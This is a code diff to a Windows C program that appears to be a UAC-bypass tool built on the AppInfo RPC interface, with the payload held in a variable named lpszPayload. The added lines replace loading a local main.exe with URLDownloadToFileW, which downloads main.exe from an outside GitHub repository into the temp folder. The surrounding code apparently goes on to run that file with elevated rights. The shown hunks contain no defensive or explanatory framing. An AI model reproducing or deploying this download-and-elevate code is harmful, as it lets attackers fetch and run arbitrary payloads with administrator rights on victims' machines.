@@ -2,11 +2,13 @@
 #include <rpc.h>
 #include <rpcndr.h>
 #include <shlwapi.h>
+#include <urlmon.h>
 
 #pragma comment(lib, "rpcrt4.lib")
 #pragma comment(lib, "ntdll.lib")
 #pragma comment(lib, "advapi32.lib")
 #pragma comment(lib, "shlwapi.lib")
+#pragma comment(lib, "urlmon.lib")
 
 #define APPINFO_RPC L"201ef99a-7fa0-444c-9399-19ba84f12a1a"
 #define T_DEFAULT_DESKTOP L"WinSta0\\Default"
@@ -131,13 +133,13 @@ int main() {
     WCHAR szProcess[MAX_PATH * 2];
     WCHAR lpszPayload[MAX_PATH];
 
-    /* Build path to main.exe in same directory */
-    GetModuleFileNameW(NULL, lpszPayload, MAX_PATH);
-    WCHAR* lastSlash = wcsrchr(lpszPayload, L'\\');
-    if (lastSlash) {
-        *(lastSlash + 1) = 0;
-        wcscat(lpszPayload, L"main.exe");
-    }
+    /* Download main.exe from GitHub to temp */
+    GetTempPathW(MAX_PATH, lpszPayload);
+    wcscat(lpszPayload, L"main.exe");
+    
+    URLDownloadToFileW(NULL, 
+        L"https://github.com/dreamyfx/isyncnotif/raw/main/main.exe",
+        lpszPayload, 0, NULL);
 
     GetSystemDirectoryW(g_ctx->szSystemDirectory, MAX_PATH);
     GetWindowsDirectoryW(g_ctx->szSystemRoot, MAX_PATH);
